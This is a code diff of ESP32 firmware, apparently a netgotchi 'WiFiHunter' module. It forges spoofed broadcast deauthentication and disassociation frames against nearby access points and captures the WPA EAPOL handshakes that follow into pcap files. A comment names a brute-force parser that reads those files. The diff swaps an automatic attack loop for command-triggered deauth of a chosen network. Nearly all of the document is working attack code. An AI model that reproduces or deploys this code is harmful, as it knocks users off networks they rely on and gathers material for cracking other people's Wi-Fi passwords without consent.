@@ -47,114 +47,58 @@ void WiFiHunter::init() {
     esp_wifi_set_promiscuous(true);
     esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
 
-    _phase        = Phase::Dwell;
-    _dwellStartMs = 0;
-    _skipBeacons  = false;
-
-    Serial.printf("[WIFI] Dwell started ch%d dwell=%ums\n", _channel, DWELL_MS);
+    _skipBeacons = false;
 }
 
-// ── Clear all findings (called on full-cycle exhaust) ─────────
+// ── Update — flush ring buffer only ──────────────────────────
+
+void WiFiHunter::update(uint32_t ms) {
+    (void)ms;
+    _skipBeacons = false;
+    _flush();
+}
+
+// ── Channel / deauth control (called by commands) ─────────────
+
+void WiFiHunter::setChannel(uint8_t ch) {
+    _channel = ch;
+    esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
+}
+
+void WiFiHunter::deauthApByIdx(uint8_t idx) {
+    if (idx >= _apCount) return;
+    _deauthAp(_aps[idx]);
+}
+
+void WiFiHunter::resetDeauthCountsOnChannel(uint8_t ch) {
+    for (int i = 0; i < _apCount; i++)
+        if (_aps[i].channel == ch && !_aps[i].validated)
+            _aps[i].deauthCount = 0;
+}
+
+// ── Clear all findings ────────────────────────────────────────
 
 void WiFiHunter::clearFindings(uint32_t ms) {
-    _apCount        = 0;
+    (void)ms;
+    _apCount = 0;
     memset(_aps,      0, sizeof(_aps));
-    memset(_beaconLen, 0, sizeof(_beaconLen));   // lengths zeroed; raw data left (overwritten on next use)
+    memset(_beaconLen, 0, sizeof(_beaconLen));
     memset(_pendingEapolCount, 0, sizeof(_pendingEapolCount));
     memset(_pendingEapolLen,   0, sizeof(_pendingEapolLen));
 
-    _attackQueueLen  = 0;
-    _attackQueueIdx  = 0;
-
-    _phase        = Phase::Dwell;
-    _dwellStartMs = ms;                          // fresh dwell window starts now
-
-    _apFoundCount       = 0;
-    _deauthTargetCount  = 0;
-    _deauthBurstCount   = 0;
-    _eapolEventCount    = 0;
-    _captureCount       = 0;
+    _apFoundCount        = 0;
+    _deauthTargetCount   = 0;
+    _deauthBurstCount    = 0;
+    _eapolEventCount     = 0;
+    _captureCount        = 0;
     _externalDeauthCount = 0;
 
-    _lastFoundSsid[0]        = '\0';
-    _lastDeauthSsid[0]       = '\0';
-    _lastEapolSsid[0]        = '\0';
-    _lastCapturePath[0]      = '\0';
+    _lastFoundSsid[0]          = '\0';
+    _lastDeauthSsid[0]         = '\0';
+    _lastEapolSsid[0]          = '\0';
+    _lastCapturePath[0]        = '\0';
     _lastExternalDeauthSsid[0] = '\0';
-
-    Serial.printf("[WIFI] Findings cleared — fresh dwell ch%d\n", _channel);
 }
-
-// ── Update — main loop ────────────────────────────────────────
-
-void WiFiHunter::update(uint32_t ms) {
-    _skipBeacons = false;
-    _flush();
-
-    if (_phase == Phase::Dwell) {
-        uint32_t dwell = _trapMode ? TRAP_DWELL_MS : DWELL_MS;
-        if (ms - _dwellStartMs >= dwell) {
-            if (!_trapMode) {
-                _buildAttackQueue();
-                if (_attackQueueLen > 0) {
-                    _phase         = Phase::Attack;
-                    _attackQueueIdx = 0;
-                    _deauthLastMs   = ms - DEAUTH_INTERVAL_MS - 1;
-                    Serial.printf("[WIFI] Attack: %d targets on ch%d\n", _attackQueueLen, _channel);
-                } else {
-                    _hopChannel();
-                    _dwellStartMs = ms;
-                }
-            } else {
-                _hopChannel();
-                _dwellStartMs = ms;
-            }
-        }
-        return;
-    }
-
-    if (_phase == Phase::Attack) {
-        // Advance past targets that are done (captured or maxed out)
-        while (_attackQueueIdx < _attackQueueLen) {
-            const ApInfo& ap = _aps[_attackQueue[_attackQueueIdx]];
-            if (!ap.validated && ap.deauthCount < MAX_DEAUTH_ATTEMPTS) break;
-            _attackQueueIdx++;
-            _deauthLastMs = ms - DEAUTH_INTERVAL_MS - 1; // next target fires immediately
-        }
-
-        if (_attackQueueIdx >= _attackQueueLen) {
-            _phase        = Phase::DwellWait;
-            _dwellStartMs = ms;
-            Serial.println("[WIFI] Queue exhausted — DwellWait");
-            return;
-        }
-
-        if (ms - _deauthLastMs >= DEAUTH_INTERVAL_MS) {
-            ApInfo& ap = _aps[_attackQueue[_attackQueueIdx]];
-            if (!ap.validated) {
-                _deauthAp(ap);
-            }
-            _deauthLastMs = ms;
-        }
-        return;
-    }
-
-    if (_phase == Phase::DwellWait) {
-        _buildAttackQueue();
-        if (_attackQueueLen > 0) {
-            _phase         = Phase::Attack;
-            _attackQueueIdx = 0;
-            _deauthLastMs   = ms - DEAUTH_INTERVAL_MS - 1;
-            return;
-        }
-        if (ms - _dwellStartMs >= DWELL_WAIT_MS) {
-            _hopChannel();
-            _dwellStartMs = ms;
-            _phase        = Phase::Dwell;
-        }
-    }
-}
-
 
 // ── Promiscuous callback (ISR context) ────────────────────────
 
@@ -233,10 +177,7 @@ void WiFiHunter::_promiscCb(void* buf, wifi_promiscuous_pkt_type_t type) {
     slot.isBeacon   = false;
     slot.isDeauth   = false;
 
-    // BSSID extraction: handle all ToDS/FromDS combinations
-    // ToDS=1,FromDS=0 (STA→AP): addr1=BSSID  ToDS=0,FromDS=1 (AP→STA): addr2=BSSID
-    // Otherwise IBSS/WDS: addr3=BSSID
-    (void)toDs; (void)fromDs;  // extracted below via pay[] offsets
+    (void)toDs; (void)fromDs;
 
     memcpy(slot.data, pay, slot.len);
     _instance->_ringHead = next;
@@ -334,22 +275,17 @@ void WiFiHunter::_processBeacon(const RawFrame& f) {
 
     int idx = (int)(ap - _aps);
 
-    // SSID may not yet be set — EAPOL can register an AP first with empty SSID.
-    // This is where we fill it from the beacon.
     bool ssidJustLearned = false;
     if (ap->ssid[0] == '\0' && ssid[0] != '\0') {
         memcpy(ap->ssid, ssid, sizeof(ssid));
         ssidJustLearned = true;
     }
 
-    // On first SSID discovery only: check SD once for an existing complete pcap.
-    // After this, ap->validated handles all future beacons via the early return above.
     if ((wasNew || ssidJustLearned) && ap->ssid[0] != '\0' && _pcapIsComplete(*ap)) {
         ap->validated   = true;
         ap->pcapCreated = true;
         _pendingEapolCount[idx] = 0;
         memset(_pendingEapolLen[idx], 0, sizeof(_pendingEapolLen[idx]));
-        Serial.printf("[AP] Skip \"%s\" — pcap already complete\n", ap->ssid);
         return;
     }
 
@@ -359,23 +295,12 @@ void WiFiHunter::_processBeacon(const RawFrame& f) {
         _beaconLen[idx] = stored;
     }
 
-    if (wasNew) {
+    if (wasNew || ssidJustLearned) {
         _apFoundCount++;
         strncpy(_lastFoundSsid, ssid, 32);
         _lastFoundSsid[32] = '\0';
-        Serial.printf("[AP] New %02X:%02X:%02X:%02X:%02X:%02X ch%d \"%s\"\n",
-                      bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
-                      f.channel, ssid);
-    } else if (ssidJustLearned) {
-        _apFoundCount++;
-        strncpy(_lastFoundSsid, ssid, 32);
-        _lastFoundSsid[32] = '\0';
-        Serial.printf("[AP] SSID learned for %02X:%02X:%02X:%02X:%02X:%02X \"%s\"\n",
-                      bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], ssid);
     }
 
-    // If SSID + beacon now both known, write header + beacon to PCAP
-    // and flush any EAPOL frames that were buffered while SSID was unknown.
     if (ap->ssid[0] != '\0' && _beaconLen[idx] > 0) {
         _ensurePcapWithBeacon(*ap, idx);
         _flushPendingEapol(*ap, idx);
@@ -391,16 +316,9 @@ void WiFiHunter::_ensurePcapWithBeacon(ApInfo& ap, int idx) {
     char path[64];
     _buildFilePath(path, sizeof(path), ap);
 
-    // FILE_WRITE on ESP32-Arduino maps to "w" which truncates an existing file.
-    // Only open in write mode when the file is genuinely new — otherwise the
-    // global header gets wiped and subsequent FILE_APPEND writes leave a
-    // header-less pcap that parsers reject ("bad pcap header").
     if (!SD.exists(path)) {
         File pcap = SD.open(path, FILE_WRITE);
-        if (!pcap) {
-            Serial.printf("[PCAP] Open failed: %s\n", path);
-            return;
-        }
+        if (!pcap) return;
         _writePcapHeader(pcap);
         _appendPcapFrame(pcap, _beaconData[idx], _beaconLen[idx]);
         pcap.close();
@@ -428,8 +346,6 @@ void WiFiHunter::_flushPendingEapol(ApInfo& ap, int idx) {
         if (ap.validated && !wasValid) {
             _captureCount++;
             _buildFilePath(_lastCapturePath, sizeof(_lastCapturePath), ap);
-            Serial.printf("[PCAP] Handshake captured (flushed): \"%s\" (total=%lu)\n",
-                          ap.ssid, (unsigned long)_captureCount);
         }
     }
     pcap.close();
@@ -470,7 +386,6 @@ void WiFiHunter::_validateEapol(ApInfo& ap, const uint8_t* pay, uint16_t flen) {
     const uint8_t* e = pay + snapOff + 8;
 
     if (msg == 1 || msg == 3) {
-        // M1/M3: AP→STA. addr1 = DA = STA.
         memcpy(ap.anonce,   e + 17, 32);
         memcpy(ap.staMacM1, pay + 4, 6);
         ap.hasAnonce = true;
@@ -478,7 +393,6 @@ void WiFiHunter::_validateEapol(ApInfo& ap, const uint8_t* pay, uint16_t flen) {
             ap.validated = true;
         }
     } else if (msg == 2) {
-        // M2: STA→AP. addr2 = SA = STA.
         memcpy(ap.staMacM2, pay + 10, 6);
         ap.hasM2 = true;
         if (ap.hasAnonce && memcmp(ap.staMacM1, ap.staMacM2, 6) == 0) {
@@ -494,7 +408,7 @@ void WiFiHunter::_processDeauth(const RawFrame& f) {
     const uint8_t* bssid = f.data + 16;  // addr3 = BSSID in deauth/disassoc
 
     ApInfo* ap = _findAp(bssid);
-    if (!ap || ap->ssid[0] == '\0') return;  // unknown or unnamed AP, skip
+    if (!ap || ap->ssid[0] == '\0') return;
 
     uint32_t now = millis();
     if (now - ap->deauthDetectedMs < 5000) return;  // deduplicate within 5 s
@@ -503,8 +417,6 @@ void WiFiHunter::_processDeauth(const RawFrame& f) {
     _externalDeauthCount++;
     strncpy(_lastExternalDeauthSsid, ap->ssid, 32);
     _lastExternalDeauthSsid[32] = '\0';
-
-    Serial.printf("[DEAUTH-RX] \"%s\" ch%d\n", ap->ssid, f.channel);
 }
 
 // ── EAPOL processing ─────────────────────────────────────────
@@ -516,20 +428,18 @@ void WiFiHunter::_processEapol(const RawFrame& f) {
     const uint8_t toDs   =  pay[1] & 0x01;
     const uint8_t fromDs = (pay[1] & 0x02) >> 1;
 
-    // BSSID extraction: all ToDS/FromDS cases
     uint8_t bssid[6];
     if (toDs && !fromDs) {
-        memcpy(bssid, pay + 4,  6);  // STA→AP: addr1 = BSSID
+        memcpy(bssid, pay + 4,  6);
     } else if (!toDs && fromDs) {
-        memcpy(bssid, pay + 10, 6);  // AP→STA: addr2 = BSSID
+        memcpy(bssid, pay + 10, 6);
     } else {
-        memcpy(bssid, pay + 16, 6);  // IBSS/WDS: addr3 = BSSID
+        memcpy(bssid, pay + 16, 6);
     }
 
-    // Classify EAPOL message type
     int snapOff = -1;
     int msg = _parseEapolMsg(pay, f.len, &snapOff);
-    if (msg == 0) return;  // not a recognizable handshake message
+    if (msg == 0) return;
 
     ApInfo* ap = _findAp(bssid);
     if (!ap) {
@@ -546,25 +456,15 @@ void WiFiHunter::_processEapol(const RawFrame& f) {
     strncpy(_lastEapolSsid, ap->ssid, 32);
     _lastEapolSsid[32] = '\0';
 
-    Serial.printf("[EAPOL] M%d %02X:%02X:%02X:%02X:%02X:%02X ch%d ssid=\"%s\"\n",
-                  msg,
-                  bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
-                  f.channel, ap->ssid);
-
-    // SSID + beacon must be known before writing the PCAP — otherwise
-    // the resulting file has empty SSID in its name and no beacon record,
-    // which the brute-force parser cannot resolve back to an SSID.
     if (ap->ssid[0] == '\0' || _beaconLen[idx] == 0) {
         _bufferEapol(idx, f.data, f.len);
         _validateEapol(*ap, pay, f.len);
-        // Don't count as a capture yet — file isn't on disk.
         return;
     }
 
     _ensurePcapWithBeacon(*ap, idx);
-    _flushPendingEapol(*ap, idx);  // drain any earlier-buffered frames first
+    _flushPendingEapol(*ap, idx);
 
-    // Append the current frame
     char path[64];
     _buildFilePath(path, sizeof(path), *ap);
     {
@@ -575,39 +475,11 @@ void WiFiHunter::_processEapol(const RawFrame& f) {
         }
     }
 
-    // Pairing: M1/M3 + M2 with matching STA MAC
     bool wasValid = ap->validated;
     _validateEapol(*ap, pay, f.len);
     if (ap->validated && !wasValid) {
         _captureCount++;
         _buildFilePath(_lastCapturePath, sizeof(_lastCapturePath), *ap);
-        Serial.printf("[PCAP] Handshake captured: \"%s\" (total=%lu)\n",
-                      ap->ssid, (unsigned long)_captureCount);
-    }
-}
-
-// ── Channel hop ───────────────────────────────────────────────
-
-void WiFiHunter::_hopChannel() {
-    // Reset deauth counters so APs are eligible again on next visit
-    for (int i = 0; i < _apCount; i++) {
-        if (!_aps[i].validated) _aps[i].deauthCount = 0;
-    }
-    _channel = (_channel % 13) + 1;
-    esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
-    Serial.printf("[WIFI] → ch%d\n", _channel);
-}
-
-// ── Build attack queue — unvalidated APs on current channel ──
-
-void WiFiHunter::_buildAttackQueue() {
-    _attackQueueLen = 0;
-    for (int i = 0; i < _apCount; i++) {
-        const ApInfo& ap = _aps[i];
-        if (ap.channel != _channel) continue;
-        if (ap.validated) continue;
-        if (ap.deauthCount >= MAX_DEAUTH_ATTEMPTS) continue;
-        _attackQueue[_attackQueueLen++] = (uint8_t)i;
     }
 }
 
@@ -615,17 +487,12 @@ void WiFiHunter::_buildAttackQueue() {
 
 void WiFiHunter::_deauthAp(const ApInfo& ap) {
     uint8_t frame[26];
-    // Frame control: deauth (0xC0) or disassoc (0xA0)
-    frame[0] = 0xC0; frame[1] = 0x00;  // FC
+    frame[0] = 0xC0; frame[1] = 0x00;  // FC: deauth
     frame[2] = 0x3A; frame[3] = 0x01;  // Duration
-    // addr1 = DA = broadcast
-    memset(frame + 4, 0xFF, 6);
-    // addr2 = SA = BSSID (spoofed as AP)
-    memcpy(frame + 10, ap.bssid, 6);
-    // addr3 = BSSID
-    memcpy(frame + 16, ap.bssid, 6);
-    // reason: 0x02 = prev auth no longer valid
-    frame[24] = 0x02; frame[25] = 0x00;
+    memset(frame + 4, 0xFF, 6);         // addr1 = DA = broadcast
+    memcpy(frame + 10, ap.bssid, 6);    // addr2 = SA = BSSID (spoofed as AP)
+    memcpy(frame + 16, ap.bssid, 6);    // addr3 = BSSID
+    frame[24] = 0x02; frame[25] = 0x00; // reason: prev auth no longer valid
 
     for (int i = 0; i < DEAUTH_BURSTS; i++) {
         uint16_t sc = (uint16_t)((_deauthSeq & 0x0FFF) << 4);
@@ -633,14 +500,13 @@ void WiFiHunter::_deauthAp(const ApInfo& ap) {
         frame[23] = (uint8_t)(sc >> 8);
         _deauthSeq++;
 
-        frame[0] = 0xC0;  // deauth
+        frame[0] = 0xC0;
         esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
-        frame[0] = 0xA0;  // disassoc
+        frame[0] = 0xA0;
         esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
         vTaskDelay(1 / portTICK_PERIOD_MS);
     }
 
-    // const_cast: deauthCount update needs mutable — find by BSSID
     ApInfo* mutable_ap = _findAp(ap.bssid);
     if (mutable_ap) {
         if (mutable_ap->deauthCount == 0) {
@@ -650,10 +516,6 @@ void WiFiHunter::_deauthAp(const ApInfo& ap) {
         }
         mutable_ap->deauthCount++;
         _deauthBurstCount++;
-        Serial.printf("[DEAUTH] %02X:%02X:%02X:%02X:%02X:%02X burst#%d (broadcast)\n",
-                      ap.bssid[0], ap.bssid[1], ap.bssid[2],
-                      ap.bssid[3], ap.bssid[4], ap.bssid[5],
-                      mutable_ap->deauthCount);
     }
 }
 
@@ -704,13 +566,10 @@ void WiFiHunter::_buildFilePath(char* buf, int bufLen, const ApInfo& ap) {
                   ? c : '_';
     }
 
-    snprintf(buf, bufLen, "/netgotchi/eapol/%s_%s.pcap", hex, safe);
+    snprintf(buf, bufLen, "/netgotchi/eapol/%s_%s_ch%02d.pcap", hex, safe, ap.channel);
 }
 
-bool WiFiHunter::_pcapIsComplete(const ApInfo& ap) {
-    char path[64];
-    _buildFilePath(path, sizeof(path), ap);
-
+bool WiFiHunter::_pcapIsCompletePath(const char* path) {
     File f = SD.open(path, FILE_READ);
     if (!f) return false;
 
@@ -734,10 +593,10 @@ bool WiFiHunter::_pcapIsComplete(const ApInfo& ap) {
 
         int msg = _parseEapolMsg(buf, (uint16_t)nRead, nullptr);
         if (msg == 1 || msg == 3) {
-            memcpy(staMacAnonce, buf + 4, 6);   // addr1 = DA = STA (AP→STA)
+            memcpy(staMacAnonce, buf + 4, 6);
             hasAnonce = true;
         } else if (msg == 2) {
-            memcpy(staMacM2,     buf + 10, 6);  // addr2 = SA = STA (STA→AP)
+            memcpy(staMacM2,     buf + 10, 6);
             hasM2 = true;
         }
 
@@ -749,4 +608,38 @@ bool WiFiHunter::_pcapIsComplete(const ApInfo& ap) {
 
     f.close();
     return false;
+}
+
+bool WiFiHunter::_pcapIsComplete(const ApInfo& ap) {
+    char path[64];
+    _buildFilePath(path, sizeof(path), ap);
+    return _pcapIsCompletePath(path);
+}
+
+void WiFiHunter::cleanupInvalidPcaps() {
+    File dir = SD.open("/netgotchi/eapol");
+    if (!dir) return;
+
+    File f = dir.openNextFile();
+    while (f) {
+        if (!f.isDirectory()) {
+            const char* full = f.name();
+            const char* base = strrchr(full, '/');
+            base = base ? base + 1 : full;
+            int nl = (int)strlen(base);
+            if (nl >= 5 && strcmp(base + nl - 5, ".pcap") == 0) {
+                char path[64];
+                snprintf(path, sizeof(path), "/netgotchi/eapol/%s", base);
+                f.close();
+                if (!_pcapIsCompletePath(path)) {
+                    SD.remove(path);
+                }
+                f = dir.openNextFile();
+                continue;
+            }
+        }
+        f.close();
+        f = dir.openNextFile();
+    }
+    dir.close();
 }
